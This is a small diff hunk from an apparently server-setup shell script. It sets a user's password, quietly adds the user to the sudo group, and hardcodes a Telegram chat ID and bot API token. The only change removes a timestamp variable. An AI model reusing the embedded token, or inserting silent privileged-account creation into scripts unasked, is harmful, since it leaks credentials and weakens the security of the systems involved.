@@ -339,7 +339,6 @@ function password_default() {
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
-    TIMEZONE=$(printf '%(%H:%M:%S)T')
     CHATID="-1002117725897"
     KEY="6123951004:AAFMeqbK8n2HEVyCnlUKlvnFgpCpt86wbaA"
     TIME="10"
